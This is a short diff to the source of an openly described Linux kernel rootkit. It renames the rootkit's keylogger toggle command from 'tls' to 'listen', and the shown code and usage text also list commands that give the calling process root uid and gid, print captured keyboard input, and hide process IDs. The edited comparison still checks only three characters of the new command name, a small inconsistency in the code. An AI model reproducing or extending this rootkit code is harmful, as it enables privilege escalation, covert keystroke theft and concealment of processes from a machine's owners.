@@ -148,7 +148,7 @@ USAGE:\n\
   $ ./rtcmd hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
-  tls - toggles keylogger listening on/off\n\
+  listen - toggles keylogger listening on/off\n\
   keylog -- print keyboard input log; keylogger is set to 0\n\
   hpXXXX - hides process id XXXX\n\
   sp - shows last hidden process\n\
@@ -192,7 +192,7 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 	} else if (!strncmp(buff, "sp", MIN(2, count))) {							/* shows last hidden process */
 		if (current_pid > 0) current_pid--;
 
-	} else if (!strncmp(buff, "tls", MIN(3, count))) {							/* toggle keylogger on/off */
+	} else if (!strncmp(buff, "listen", MIN(3, count))) {							/* toggle keylogger on/off */
 		key_logger = !key_logger;
 		if (current_pid > 1) current_pid--;
 	
